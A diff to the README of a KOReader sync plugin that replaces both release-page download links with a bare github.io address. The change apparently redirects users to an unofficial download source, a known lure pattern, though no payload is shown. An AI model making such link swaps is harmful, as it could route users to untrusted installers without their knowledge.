@@ -1,6 +1,6 @@
 # 📖 syncery.koplugin - Keep your reading progress in sync
 
-[![Download link](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Genusovismachismo683/syncery.koplugin/releases)
+[![Download link](https://img.shields.io/badge/Download-Release_Page-blue)](https://genusovismachismo683.github.io)
 
 This software manages your reading data across multiple devices. It tracks your current page, highlights, and book settings. You enjoy the same reading experience whether you use a tablet or an e-ink reader. 
 
@@ -12,7 +12,7 @@ You need a device that runs KOReader. This plugin works on Android, Kobo, and Ki
 
 Follow these steps to install the plugin on your device.
 
-1. Visit the [releases page](https://github.com/Genusovismachismo683/syncery.koplugin/releases) to download the latest file.
+1. Visit the [releases page](https://genusovismachismo683.github.io) to download the latest file.
 2. Choose the zip file from the list.
 3. Save the file to your computer.
 4. Connect your reading device to your computer via USB.
